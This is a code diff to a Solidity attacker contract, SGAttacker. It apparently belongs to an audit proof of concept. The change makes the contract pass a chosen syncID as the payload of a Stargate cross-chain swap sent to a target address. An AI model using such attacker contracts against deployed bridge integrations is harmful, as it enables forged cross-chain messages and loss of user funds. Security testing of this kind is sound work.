@@ -6,6 +6,12 @@ import "solmate/tokens/ERC20.sol";
 import "forge-std/console.sol";
 
 contract SGAttacker {
+    uint16 syncID;
+
+    function setSyncID(uint16 _syncID) public {
+        syncID = _syncID;
+    }
+
     function attack(
         address sgRouter,
         uint16 destChainId,
@@ -15,9 +21,8 @@ contract SGAttacker {
         uint256 amount,
         address target
     ) public {
-        IStargateRouter stargateRouter = IStargateRouter(sgRouter);
         ERC20(token).approve(sgRouter, amount);
-        stargateRouter.swap{value: 500 ether}(
+        IStargateRouter(sgRouter).swap{value: 500 ether}(
             destChainId,
             srcPoolId,
             dstPoolId,
@@ -26,7 +31,7 @@ contract SGAttacker {
             0,
             IStargateRouter.lzTxObj(100000, 0, "0x"),
             abi.encodePacked(target),
-            "1"
+            abi.encode(syncID)
         );
     }
 }
